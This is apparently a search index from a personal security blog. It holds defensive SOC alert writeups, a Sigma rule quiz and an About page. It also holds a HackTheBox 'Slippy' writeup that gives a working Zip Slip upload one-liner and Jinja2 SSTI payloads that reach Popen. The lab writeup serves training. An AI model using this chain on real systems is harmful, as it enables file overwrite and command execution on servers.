can open the YAML file in Notepad++. Oh, it\u0026rsquo;s surprisingly short. Let\u0026rsquo;s answer the questions.\nQuestions: # Which executable file was specifically targeted by this Sigma rule? We can find this under: detection -\u0026gt; selection_img -\u0026gt; OriginalFileName Answer: bitsadmin.exe What command-line option is used to indicate a file transfer in this rule? The word \u0026ldquo;transfer\u0026rdquo; gives it away. Line 26. Answer: /transfer What logical expression in the condition field combined the criteria to trigger this rule? They mention the condition field. Line 33. Answer: selection_img and (selection_cmd or all of selection_cli_*) Which specific field did this rule capture that shows the command being executed? \u0026ldquo;fields\u0026rdquo; section seems correct. Line 34-36 Answer: CommandLine Which single ATT\u0026amp;CK tactic tag is listed first in this rule? Tags on lines 12-17, first one on line 13. Answer: attack.defense-evasion What is the primary category of events that this Sigma rule was written to monitor? \u0026ldquo;category\u0026rdquo; keyword. Line 19. Answer: process_creation What specific command-line argument did this rule look for to identify HTTP-based downloads? Quick scan for \u0026ldquo;HTTP\u0026rdquo; finds you on line 32. Answer: http Which command-line option must be present to create a new transfer using bitsadmin? Key word \u0026ldquo;create\u0026rdquo;. Line 29. Answer: /create ","date":"February 13 2026","externalUrl":null,"permalink":"/writeups/letsdefend/challenges/learn_sigma/","section":"Writeups","summary":"Analyzing a Sigma rule for detecting bitsadmin.exe abuse, explaining rule structure, detection logic, and ransomware-related process_creation monitoring.","title":"(Writeup) LetsDefend Challenge - Learn Sigma","type":"writeups"},{"content":"","date":"February 13 2026","externalUrl":null,"permalink":"/tags/sigma/","section":"Tags","summary":"","title":"Sigma","type":"tags"},{"content":"","date":"February 13 2026","externalUrl":null,"permalink":"/tags/yaml/","section":"Tags","summary":"","title":"YAML","type":"tags"},{"content":" Welcome! # HackTheBox is an offensive cybersecurity-focused platform. This is a writeup for one of their challenges. Scenario: # You\u0026rsquo;ve found a portal for a firmware upgrade service, responsible for the deployment and maintenance of rogue androids hunting humans outside the tractor city. The question is\u0026hellip; what are you going to do about it?\nChallenge Release Date: Nov, 26th 2021\nStart: # Files: # HackTheBox is always fun. We have a zip file to extract and an IP : Port combo to connect to and presumably exploit. Let\u0026rsquo;s see what we have going on.\nI spy:\nDocker - These challenges are commonly found in containers, so it\u0026rsquo;s no surprise. Web Files - Looks like the container is probably going to be a website. Python - A Python website. Alright, I guess I\u0026rsquo;ll start with the Docker files.\nDocker Files: # Ah, so it\u0026rsquo;s a Flask server. Gotta keep that in my notes. The server updates on boot, so the answer probably isn\u0026rsquo;t an old CVE.\nDon\u0026rsquo;t know if the container name will come in handy\u0026hellip; Probably not.\n\u0026ldquo;web_slippy\u0026rdquo; Running as root. Got the starting script\u0026rsquo;s name.\n\u0026ldquo;/app/run.py\u0026rdquo; Python Files: # debug=True and use_evalex=false huh?\nFrom Flask documentation: Oh, cool, we get feedback.\napplication/config.py Config application/blueprints/routes.py web application/blueprints/routes.py api Gotta check out Flask config docs, and that config.py file.\nWhat? Okay, I need more context. Also, generate imported from util.py\u0026hellip;\nFrom Flask documentation: Debugging is already true, but maybe TESTING will be useful. Also, getting that upload directory will probably come in handy.\n/app/application/static/archives I see where we\u0026rsquo;re supposed to attack now. Gonna have to investigate the extract_from_archive function in util.\nTesting: # I\u0026rsquo;m gonna create a tar.gz real quick of some dummy files, throw up Burp Suite, spawn the target host, and give it a test. Burp Suite, Proxy, Intercept, and open the browser!\nHmm\u0026hellip; I just thought about how we have debug on\u0026hellip; How can we trigger an error?\nZip Slip: # Oh, I ran into something interesting on Google, which now makes the challenge\u0026rsquo;s name make more sense\u0026hellip; Warning! While I got the flag in the end, this is not the optimal route. See the official walkthrough for that. After reviewing what files we have to override\u0026hellip; index.html seems like the way to go, we just need to get in a quick:\n{{ print(open(\u0026#34;/app/flag.txt\u0026#34;,\u0026#34;r\u0026#34;).read()) }} I can use the directory information I got from Burp Suite earlier: /app/application/static/archives/random/file\nI got stuck for a while until I found evilarc which was made for making evil archives like this.\nwget https://raw.githubusercontent.com/ptoomey3/evilarc/refs/heads/master/evilarc.py pyenv shell 2.7.18 echo \u0026#39;{{ print(open(\u0026#34;/app/flag.txt\u0026#34;,\u0026#34;r\u0026#34;).read()) }}\u0026#39; \u0026gt; index.html python evilarc.py -f evil.tar.gz -o unix -p app/application/templates/ index.html Uh-oh, I broke something. The \u0026ldquo;open\u0026rdquo; in my {{ print(open(\u0026quot;/app/flag.txt\u0026quot;,\u0026quot;r\u0026quot;).read()) }} seems to be undefined\u0026hellip;\nSSTI: # Looks like I need to do extra to get around jinja2. Thanks hacktricks! Because I kinda busted the index.html, I gotta work around it. Crazy one-liner below:\npython evilarc.py -f evil.tar.gz -o unix -p app/application/templates/ index.html \u0026gt;/dev/null ; curl -s -F \u0026#34;file=@evil.tar.gz\u0026#34; http://154.57.164.73:31820/api/unslippy -o /dev/null ; curl -s http://154.57.164.73:31820 | php -r \u0026#39;echo html_entity_decode(stream_get_contents(STDIN));\u0026#39; ; echo Let me break down this crazy one-liner:\nevilarc - takes index.html and makes a zip that can exploit zip slip. curl - sends that file to the server. curl - requests index.html; has the new output. php - fixes some of the html entities so it looks correct in the shell. Using that one-liner allowed me to quickly make changes to index.html, then run the one-liner to get feedback. After trial and error, I ended up with the following (SSTI adjacent) line:\n{{ [].__class__.__base__.__subclasses__() }} And that gave me the class list:\nIt\u0026rsquo;s quite a lot.\nReplacing each comma with a \\n lets us see the position of each subclass in the list.\nAlso, searching for \u0026ldquo;open\u0026rdquo; shows that we have access to Popen.\n{{ [].__class__.__base__.__subclasses__()[223]([\u0026#34;cat\u0026#34;,\u0026#34;/app/flag\u0026#34;],stdout=-1).communicate() }} After some back-and-forth trying to get the output from Popen, I got the flag back!\nHTB{no-free-flags} ","date":"February 12 2026","externalUrl":null,"permalink":"/writeups/hackthebox/challenges/slippy/","section":"Writeups","summary":"Demonstrating Zip Slip exploitation, Jinja2 SSTI abuse, and Flask-based web application compromise within a Docker environment.","title":"[Writeup] HackTheBox Labs - Challenge - Slippy","type":"writeups"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/docker/","section":"Tags","summary":"","title":"Docker","type":"tags"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/flask/","section":"Tags","summary":"","title":"Flask","type":"tags"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/jinja2/","section":"Tags","summary":"","title":"Jinja2","type":"tags"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/ssti/","section":"Tags","summary":"","title":"SSTI","type":"tags"},{"content":"","date":"February 12 2026","externalUrl":null,"permalink":"/tags/zip_slip/","section":"Tags","summary":"","title":"Zip_Slip","type":"tags"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # EventID: 84 Event Time: Mar 21, 2021, 01:04 PM Rule: SOC104 - Malware Detected Level: Security Analyst Source Address: 172.16.17.5 Source Hostname: SusieHost File Name: winrar600.exe File Hash: c74862e16bcc2b0e02cadb7ab14e3cd6 File Size: 2.95 Mb Device Action: Allowed Let\u0026rsquo;s get started. Creating the case. And real quick, I\u0026rsquo;m gonna throw that hash into VirusTotal to see if it\u0026rsquo;s a known binary.\nVirusTotal: # Hmm, only 1 vendor flag. It says it\u0026rsquo;s signed, so let\u0026rsquo;s check Signature Info under Details.\nLeaning towards a false positive. Let\u0026rsquo;s check hybrid-analysis as well to be sure.\nHybrid-Analysis: # Oh, they have the binary outright whitelisted. A quick analysis of the report shows that this is indeed a false positive. Time for the playbook.\nPlaybook: # The alert rule was malware detection; of the options, only \u0026ldquo;Other\u0026rdquo; fits.\nThe Alert said it was allowed (and it\u0026rsquo;s a false positive\u0026hellip;) but we follow the playbook!\nLog Management: # Filtering by source address and alert date yields a single log. Endpoint using Chrome to download WinRAR. We can quickly throw that domain name into VirusTotal as well.\n\u0026ldquo;top 1M\u0026rdquo;, created 24 years ago, and 0 vendor alerts. One last check: Google.\nFirst non-advertisement is indeed that domain. Let\u0026rsquo;s check the endpoint.\nEndpoint Security: # Uh, it\u0026rsquo;s offline. Not optimal. What can you do besides work with what you\u0026rsquo;ve got?\nWell\u0026hellip; Back to the playbook!\nIt isn\u0026rsquo;t quarantined; the \u0026ldquo;malware\u0026rdquo; did make it on the box.\nWe already did. It\u0026rsquo;s benign. False Positive!\nFinishing Up: # MD5 Hash from our notes. Comment: \u0026ldquo;Benign - WinRAR\u0026rdquo;\nAnalyst Note:\nSummary: False Positive, WinRAR Installer. The user used Chrome to download WinRAR from the official website. Benign, verified using VirusTotal and Hybrid-Analysis. No weird network logs. Endpoint is offline.\nNote:\nSummary: False Positive, WinRAR Installer.\nResult: # Hope this helps!\n","date":"February 12 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/104_84/","section":"Writeups","summary":"Investigating a malware detection alert, validating the WinRAR installer hash using VirusTotal and Hybrid Analysis, reviewing SIEM logs, and determining a false positive.","title":"(Writeup) LetsDefend EventID: 84 - [SOC104 - Malware Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Let\u0026rsquo;s start by copying over the alert details into our notes, and start the case. We\u0026rsquo;re going to follow the playbook the entire time for this alert.\nPlaybook: # We have the answers to most of these questions in our notes:\nMay, 13, 2024, 09:22 AM 103.80.134.63 free@coffeeshooop.com Felix@letsdefend.io We can look in Email Security for the last two questions:\nEmail Security: # Filtering on the phishing email address we quickly find the email; and the answers to the questions:\nYes, it is indeed suspicious. Yes, there is an attachment. Yeah, there was both a URL and an attachment of the same thing: \u0026ldquo;free-coffee.zip\u0026rdquo;\nI would just throw the URL into VirusTotal; however, to avoid hosting actual malware, there is an extra screen that requires confirmation before downloading. So if you are in a security analyst environment where it is safe to be downloading malware, great! If not, this is the SHA-256 hash to follow along: 6f33ae4bf134c49faa14517a275c039ca1818b24fc2304649869e399ab2fb389\nBoth the attachment at the bottom and the big button lead to the file download.\nNote: If you do this in Chrome, it will block it by default.\nVirusTotal: # You can throw either the hash or the zip file into VirusTotal: Yep, indeed malicious. Let\u0026rsquo;s dig into the details to see if we can find C2 IPs to use as IOCs.\nUnder \u0026ldquo;RELATIONS,\u0026rdquo; we can find the Bundled Files, and it looks like the included EXE is known. You can click on that SHA-256 hash to go straight to its report.\nLet\u0026rsquo;s dig for C2 IP or hostnames.\nOkay, not using domain names. The \u0026ldquo;Contacted IP addresses\u0026rdquo; list contains many unrelated IPs.\nAh, found it. Under the \u0026ldquo;BEHAVIOR\u0026rdquo; tab, you can find a subcategory of \u0026ldquo;Network Communication\u0026rdquo;, and 37.120.223.226:3451 is the only connection all the sandboxes agree on. We know it\u0026rsquo;s malicious, time to continue the playbook.\nIndeed Malicious.\nWe know this from the Alert details in our notes: It was \u0026ldquo;allowed\u0026rdquo;, which means it was delivered.\nBrief stop over at Email Security.\nBack to playbook!\nAh, I had a feeling that the C2 address would come in handy. Let\u0026rsquo;s check log management.\nLog Management: # The Basic view is good enough; only 4 logs appear when I enter the C2 address.\nYes, the endpoint did indeed contact the C2. Looks like the endpoint is infected. I\u0026rsquo;d like to immediately quarantine the endpoint, but I\u0026rsquo;ll follow the playbook.\nYes, the endpoint is infected.\nOh, good to know my gut was right. Let\u0026rsquo;s head over to Endpoint Security.\nEndpoint Security: # A quick containment, also showing that \u0026ldquo;Coffee.exe\u0026rdquo; is still running.\nContained!\nClean Up: # I attached the IP of the SMTP server being used for Phishing as the Artifact. Comment was: \u0026ldquo;Malicious - Phishing SMTP Server\u0026rdquo;\nAnalyst Note:\nSummary: True Positive. Endpoint is infected. Initiated containment.\nPhishing email from SMTP Server: 103.80.134.63\nMalicious Zip File: https://www.virustotal.com/gui/file/6f33ae4bf134c49faa14517a275c039ca1818b24fc2304649869e399ab2fb389\nMalicious Exe File: https://www.virustotal.com/gui/file/cd903ad2211cf7d166646d75e57fb866000f4a3b870b5ec759929be2fd81d334\nDeleted phishing email.\nEndpoint did contact malware\u0026rsquo;s C2.\nEndpoint ran malware.\nInitiated containment for the endpoint.\nSummary from notes:\nTrue Positive. Endpoint is infected. Initiated containment. Results: # Hope this helps!\n","date":"February 12 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/282_257/","section":"Writeups","summary":"Investigating a deceptive email alert, analyzing a malicious ZIP attachment in VirusTotal, identifying C2 communication, correlating SIEM logs, and initiating endpoint containment.","title":"(Writeup) LetsDefend EventID: 257 - [SOC282 - Phishing Alert - Deceptive Mail Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Oh\u0026hellip; It was allowed\u0026hellip; oh no.\nActions:\nCopy alert details to notes. Check the file hash in VirusTotal to see if it\u0026rsquo;s known. Create Case. VirusTotal: # \u0026hellip;oh boy. The ransomware was allowed.\nPlaybook: # Let\u0026rsquo;s start the playbook.\n\u0026ldquo;Other\u0026rdquo; is the only one that fits this alert.\nTime for Log Management and Endpoint Security.\nLog Management: # Given the alert date/time, we have no relevant logs.\nEndpoint Security: # The EDR agent has been removed, and the ransomware is running.\nAction:\nContaining the endpoint. Playbook (continued): # Yeah, the host is not quarantined. That box is infected!\nLooking at VirusTotal, I didn\u0026rsquo;t see any C2. But let\u0026rsquo;s check out Hybrid-Analysis.\nHybrid Analysis: # Thought so, but had to be sure.\nPlaybook (continued): # It is indeed Malicious - Ransomware.\nAfter double-checking with Hybrid Analysis, there is indeed no C2 for this ransomware. So no, not accessed.\nWe have the MD5 hash, so we add it. Comment: \u0026ldquo;Malicious - Ransomware.Avaddon\u0026rdquo;\nNote:\nFile was verified to be Ransomware via VirusTotal and Hybrid-Analysis. Endpoint EDR Agent was removed. Endpoint is infected. Endpoint Containment has been enabled. Clean up: # Same note:\nFile was verified to be Ransomware via VirusTotal and Hybrid-Analysis. Endpoint EDR Agent was removed. Endpoint is infected. Endpoint Containment has been enabled. Result: # Hope this helps!\n","date":"February 11 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/145_92/","section":"Writeups","summary":"Investigating a true positive malware detection alert, validating Avaddon ransomware via VirusTotal and Hybrid Analysis, identifying EDR removal, and initiating endpoint containment from a SOC analyst perspective.","title":"(Writeup) LetsDefend EventID: 92 - [SOC145 - Ransomware Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Well, on the bright side: It\u0026rsquo;s cleaned!\nActions:\nCopy alert details into notes. Create Case. Copy the hash into VirusTotal to see if it\u0026rsquo;s a known file. Virus Total: # True Positive on the alert; that is indeed Emotet.\nPlaybook: # Alright, let\u0026rsquo;s follow the playbook.\nThe alert doesn\u0026rsquo;t match any of these except \u0026ldquo;Other\u0026rdquo;.\nLet\u0026rsquo;s check out Log Management and Endpoint Security in new tabs!\nLog Management: # Given the date and time of the alert we\u0026rsquo;re investigating, there is nothing of note here.\nEndpoint Security: # Once again, if we take the alert\u0026rsquo;s date and time into account, there is nothing of note. (There are things wrong with this box, but it involves a different alert.)\nPlaybook (continued): # It was quarantined by the EDR; the alert said so, and we don\u0026rsquo;t see any signs of exploitation.\nWe\u0026rsquo;ve already done so; Emotet is indeed Malicious!\nWe already checked the host\u0026rsquo;s network logs; during the alert time period, the host didn\u0026rsquo;t \u0026ldquo;talk\u0026rdquo; to anyone.\nAttach the file\u0026rsquo;s MD5 hash from our notes, and give it a comment: \u0026ldquo;Malicious - Emotet Family Malware\u0026rdquo;\nNote:\nFile verified to be Emotet Family Malware. Endpoint didn\u0026rsquo;t connect to C2. True Positive. The agent cleaned the malware before execution.\nClean Up: # Note:\nFile verified to be Emotet Family Malware. Endpoint didn\u0026rsquo;t connect to C2. True Positive. The agent cleaned the malware before execution.\nResults: # Hope this helps!\n","date":"February 11 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/109-85/","section":"Writeups","summary":"Investigating an Emotet malware detection alert, validating the hash in VirusTotal, reviewing SIEM and endpoint logs, and confirming a true positive successfully quarantined by EDR.","title":"(Writeup) LetsDefend EventID: 85 - [SOC109 - Emotet Malware Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # \u0026hellip;Invoice.exe\u0026hellip; and it was allowed?? Oh boy. Actions:\nCopy alert details into notes, including download link for sample. Throw the file hash into VirusTotal to see if it\u0026rsquo;s a known sample. Create the case. VirusTotal: # \u0026hellip;Ah. Yep, that\u0026rsquo;s about as clear as you can get.\nPlaybook: # Let\u0026rsquo;s get that playbook going.\nThe indicator was a malware detection on the endpoint, so let\u0026rsquo;s go with \u0026ldquo;Other.\u0026rdquo;\nLet\u0026rsquo;s open Log Management and Endpoint Security in new tabs and take a look!\nLog Management: # (Taking into account the event time) We only see 1 relevant log, and inside the endpoint is connecting to that IP straight, no domain name. I\u0026rsquo;m guessing C2. Let\u0026rsquo;s use VirusTotal on that URL.\nVirusTotal # As guessed, MAZE C2. That endpoint is 100% infected. Let\u0026rsquo;s go contain it in Endpoint Security.\nEndpoint Security: # Agent isn\u0026rsquo;t installed. Yikes. Back to the Playbook in Case Management.\nPlaybook (continued): # Not Quarantined, that box is infected with Maze Ransomware.\nWell, we found a C2 address it was connecting out to, but we\u0026rsquo;ll follow the playbook. Let\u0026rsquo;s check Hybrid-Analysis.\nHybrid-Analysis: # There\u0026rsquo;s a list of C2; the first one is the one the endpoint connected to in our case.\nPlaybook (continued) # MAZE Ransomware- it is indeed Malicious.\nWe know this from checking the logs earlier! The endpoint did indeed access the C2.\nAlready did! Next!\nWe have the MD5 hash; might as well use it: Comment: \u0026ldquo;Malicious - ransomware.maze\u0026rdquo;\nNote:\nFile verified via VirusTotal and Hybrid-Analysis to be Maze Ransomware. Endpoint connected out to the C2 server: 92.63.8.47 Endpoint is infected. EDR Agent missing on endpoint. Endpoint containment initiated. True Positive Clean Up: # Same note:\nFile verified via VirusTotal and Hybrid-Analysis to be Maze Ransomware. Endpoint connected out to the C2 server: 92.63.8.47 Endpoint is infected. EDR Agent missing on endpoint. Endpoint containment initiated. True Positive Result: # Hope this helps!\n","date":"February 11 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/104-36/","section":"Writeups","summary":"Investigating a malware detection alert, confirming Maze ransomware via VirusTotal and Hybrid Analysis, identifying C2 communication, and initiating containment.","title":"(Writeup) LetsDefend EventID: 36 - [SOC104 - Malware Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # Alright! Proxy alert, it was allowed. List of actions:\nCopy the event details over to my notes. I\u0026rsquo;ll create the case. Enter the request URL into VirusTotal. Enter the destination Hostname into VirusTotal. Enter the destination IP into VirusTotal. VirusTotal: # All green, and the domain is quite old. Hmm, I\u0026rsquo;ll do a quick Google search.\nGoogle: # First non-advertisement result for WinRAR is indeed that domain. This is likely a false positive.\nPlaybook: # Let\u0026rsquo;s follow the SOC\u0026rsquo;s Playbook.\nYep, have it in the notes:\nSource Address: 172.16.17.5 Destination Address: 51.195.68.163 User-Agent: Chrome - Windows Log Management: # Alright, let\u0026rsquo;s move over to that tab and look up logs associated with:\nThe Source: 172.16.17.5 The Destination: 51.195.68.163 Going out to the website, there is only this one log that triggered the alert.\nFrom the endpoint (filtering based on the alert event time), we get the same log. We can go back to the Case Management tab and continue with the playbook.\nPlaybook (continued): # We looked at this at the beginning; it\u0026rsquo;s not a malicious domain.\nWe have the URL the system alerted on, so let\u0026rsquo;s attach it and note that it\u0026rsquo;s benign and what it\u0026rsquo;s related to.\nTime to write a note:\nChecked the reputation of URL, domain, and IP on VirusTotal and Google. False Positive - WinRAR Clean Up: # I put the same note I put before:\nChecked the reputation of URL, domain, and IP on VirusTotal and Google. False Positive - WinRAR Results: # Hope this helps!\n","date":"February 11 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/119_83/","section":"Writeups","summary":"Investigating a malicious executable detection alert, validating URL, domain, and IP reputation using VirusTotal and log analysis, and determining a false positive.","title":"(Writeup) LetsDefend EventID: 83 - [SOC119 - Proxy - Malicious Executable File Detected]","type":"writeups"},{"content":" Welcome! # LetsDefend is a Blue Team Training platform. This writeup is for an alert on the LetsDefend simulated SOC. The Alert: # I\u0026rsquo;ll copy the alert details into my scratch notepad for easy recollection, and throw that MD5 hash into VirusTotal!\nVirusTotal: # Oh, looks like we got the answer early. Binary is signed by Google, commonly scanned, and commonly flagged as okay, so it\u0026rsquo;s likely a false positive. Still gotta investigate though.\nPlaybook: # Let\u0026rsquo;s start the Playbook!\nThe alert rule doesn\u0026rsquo;t really fit any of those, so \u0026ldquo;Other\u0026rdquo;.\nI\u0026rsquo;ll open Log Management and Endpoint Security other tabs, so we don\u0026rsquo;t lose where we are in the playbook.\nLog Management: # For LetsDefend, keep an eye on the Date/Time; the details you are looking for should be around the same time as the event you are investigating. No network logs for the period of time we\u0026rsquo;re looking for.\nEndpoint Management: # In the processes, you can see that GoogleUpdate.exe is indeed running, and the hash matches the alert.\nPlaybook (continued): # So, no, it\u0026rsquo;s not quarantined.\nLooked at this at the start. The binary is a known-good, signed binary for updating Google Chrome.\nSince we have the MD5 Hash on hand, we\u0026rsquo;ll just attach that and comment that it\u0026rsquo;s Benign.\nThe analysis was simple, so my notes were too:\nFalse Positive, Benign. Google Chrome Installer/Updater, signed by Google.\nPersonally, I paste my notes into the Alert closing note as well.\nFalse Positive, Benign. Google Chrome Installer/Updater, signed by Google.\nResult: # Hope you found this helpful!\n","date":"February 10 2026","externalUrl":null,"permalink":"/writeups/letsdefend/soc/104_14/","section":"Writeups","summary":"Investigating a malware detection alert, validating file reputation in VirusTotal, reviewing endpoint and log data, and determining a false positive.","title":"(Writeup) LetsDefend EventID: 14 - [SOC104 - Malware Detected]","type":"writeups"},{"content":" Howdy — I’m Reed Eggleston # I’m an entry-level cybersecurity professional with a B.S. in Cybersecurity and Information Assurance, focused on becoming a strong SOC analyst through deliberate, hands-on practice.\nThis site is where I document what I’m learning, how I think through investigations, and the systems I build along the way.\nCurrently open to SOC Analyst I opportunities.\nConnect with me on LinkedIn.\nWhat I’m Actively Working On # HackTheBox # Profile\n48 Machines Pwned 6 Sherlocks Completed 15 Challenges Solved Focus: Reconnaissance, Initial Access, Lateral Movement, and Privilege Escalation.\nLetsDefend # Profile\n12 Courses (107 Lessons) Completed 7 Alerts Closed Correctly 8 Challenges Completed Focus: SOC Alert triage, sandbox malware analysis, distinguishing true/false positives, and documentation.\nEducation # Western Governors University\nBachelor of Science — Cybersecurity and Information Assurance\nCertifications # (ISC)²\nSSCP CompTIA\nCySA+ PenTest+ Network+ A+ Project+ (Not listing certifications that have lapsed — happy to discuss.)\nExperience # Managed Service Provider (MSP) Technician # Digital Fire Team (2017, ~6 months)\nWorked in an MSP environment supporting client systems and technical operations.\nUsed SolarWinds for monitoring and troubleshooting across multiple environments.\nThis role gave me early exposure to:\nOperational uptime expectations Escalation workflows Clear communication with non-technical stakeholders Summer Intern # Delta Risk (2015)\nAssisted in developing web-based tools to support tabletop exercise documentation and planning.\nContributed to:\nTranslating operational requirements into technical functionality Supporting structured security planning processes Volunteering # CyberTexas Foundation (2020–2022) # Supported a nonprofit by translating leadership goals into technical designs and implementation plans.\nProvided technical guidance during stakeholder planning discussions Helped bridge communication between technical and non-technical audiences Beyond Security # I read manga \u0026amp; Chinese cultivation novels. I think opossums are underrated. Connect # If you’re interested in collaborating, comparing notes, or talking through investigations, feel free to reach out.\n","date":"February 10 2026","externalUrl":null,"permalink":"/about/","section":"Policy to Packets","summary":"Reed Eggleston is an entry-level cybersecurity professional with a B.S. in Cybersecurity and Information Assurance, actively building hands-on SOC analyst skills through HackTheBox, LetsDefend, and real-world investigation documentation.","title":"About Me","type":"page"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]